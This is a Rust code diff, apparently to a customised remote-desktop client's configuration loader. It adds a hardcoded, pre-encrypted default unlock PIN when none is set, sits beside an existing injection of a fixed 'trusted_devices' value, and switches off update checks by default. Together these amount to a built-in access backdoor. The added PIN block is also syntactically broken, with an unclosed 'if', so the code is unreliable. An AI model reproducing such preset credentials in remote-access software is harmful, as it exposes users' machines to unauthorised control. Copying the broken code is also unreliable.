@@ -553,6 +553,12 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        // 1. 自动设置默认 PIN 码
+        if config.unlock_pin.is_empty() {
+            // 对应明文：你的预设 PIN 码
+            config.unlock_pin = "00A+IC2fNLByi8nAuEH9Erlv2SdDU=".to_string();
+            store = true; 
+        // 2. 自动注入信任设备配置
         if !config.options.contains_key("trusted_devices") {
             // 这里注入的是加密后的密码哈希，确保客户端启动时直接拥有特定的安全配置
             config.options.insert("trusted_devices".to_string(), "00A+IC2fNLByi8nAuEH9Erlv2SdDU=".to_string());
@@ -2107,7 +2113,28 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        //Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+            //启将设置里的 常规-启动时检查软件更新 默认去勾
+            if !config.options.contains_key("enable-check-update") {
+                config.options.insert("enable-check-update".to_string(), "N".to_string());
+                store = true;
+            }
+            //将设置里的 常规-主题 改为默认主题为暗黑
+            if !config.options.contains_key("theme") {
+                config.options.insert("theme".to_string(), "dark".to_string());
+                store = true;
+            }
+            //将设置里的 常规-启用UDP打洞 默认打勾
+            if !config.options.contains_key("enable-udp-punch") {
+                config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+                store = true;
+            }
+        if store {
+                config.store();
+            }
+        config
     }
 
     fn store(&self) {
